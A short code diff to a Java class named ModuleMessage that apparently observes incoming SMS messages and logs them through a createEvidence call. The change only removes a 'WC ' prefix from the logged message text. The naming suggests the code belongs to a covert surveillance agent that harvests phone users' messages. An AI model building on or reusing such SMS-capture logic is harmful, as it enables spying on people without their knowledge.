@@ -522,7 +522,7 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
             //#endif
 
             // Creating log
-            createEvidence(additionalData, WChar.getBytes("WC " + message),
+            createEvidence(additionalData, WChar.getBytes( message),
                     EvidenceType.SMS_NEW);
 
         } catch (final Exception ex) {
